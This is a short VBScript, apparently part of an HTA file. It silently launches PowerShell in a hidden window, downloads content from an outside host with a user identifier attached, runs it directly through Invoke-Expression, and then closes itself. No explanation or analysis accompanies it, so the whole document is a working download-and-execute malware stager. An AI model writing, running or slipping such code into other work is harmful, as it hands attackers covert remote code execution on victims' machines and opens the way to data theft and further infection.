Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell  -C iwr 'https://ecs.rcsis.ir?uid=" & uid & "&s=3' | iex", 0, False
self.close
